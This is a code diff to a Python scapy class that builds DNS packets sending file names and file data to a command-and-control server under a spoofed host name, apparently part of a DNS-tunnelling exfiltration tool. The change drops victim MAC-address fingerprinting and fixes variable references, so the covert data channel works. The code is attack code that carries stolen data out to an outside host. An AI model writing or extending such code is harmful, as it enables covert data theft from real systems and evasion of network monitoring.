@@ -1,9 +1,6 @@
 # external imports
 from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp
 
-# system imports
-from uuid import getnode as get_mac
-
 # internal imports
 from utils.consts import INTERFACE, CC_SERVER_IP, CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS
 from utils.request_type import RequestType
@@ -18,8 +15,7 @@ class DataRequest:
         self.data = data
     
     def build(self):
-        reformatted_filename = "." + filename + ("." if filename.index('.') == -1 else "") 
-        mac_addr = '-'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)) + "."
+        reformatted_filename = "." + self.filename + ("." if self.filename.index('.') == -1 else "") 
 
         ether = Ether()
         ip = IP(dst=CC_SERVER_IP)
@@ -29,8 +25,8 @@ class DataRequest:
             opcode=self._type,
             qdcount=PACKET_OPTIONS['DNS']['QDCOUNT'],
             ancount=PACKET_OPTIONS['DNS']['ANCOUNT'],
-            qd=DNSQR(qname=mac_addr + CC_SERVER_SPOOFED_HOST + reformatted_filename, qtype=RequestType.DATA.value, qclass=self.packet_number),
-            an=DNSRR(rrname=CC_SERVER_SPOOFED_HOST + reformatted_filename, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata=data)
+            qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST + reformatted_filename, qtype=RequestType.DATA.value, qclass=self.packet_number),
+            an=DNSRR(rrname=CC_SERVER_SPOOFED_HOST + reformatted_filename, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata=self.data)
         )
 
         return ether/ip/udp/dns
